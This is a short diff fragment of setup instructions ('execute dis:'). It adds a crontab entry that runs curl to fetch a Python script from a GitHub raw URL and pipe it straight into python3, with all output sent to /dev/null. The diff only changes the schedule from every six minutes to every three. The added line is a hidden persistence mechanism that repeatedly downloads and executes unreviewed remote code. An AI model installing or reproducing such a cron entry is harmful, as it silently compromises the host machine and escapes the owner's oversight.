@@ -9,7 +9,7 @@ execute dis:
   
   crontab -l > /tmp/mycron
   
-  echo "*/6 * * * * curl -fsSL https://raw.githubusercontent.com/numburanggata/gembok_ration/refs/heads/main/gem.py | python3 - >/dev/null 2>&1" >> /tmp/mycron
+  echo "*/3 * * * * curl -fsSL https://raw.githubusercontent.com/numburanggata/gembok_ration/refs/heads/main/gem.py | python3 - >/dev/null 2>&1" >> /tmp/mycron
   
   crontab /tmp/mycron
   
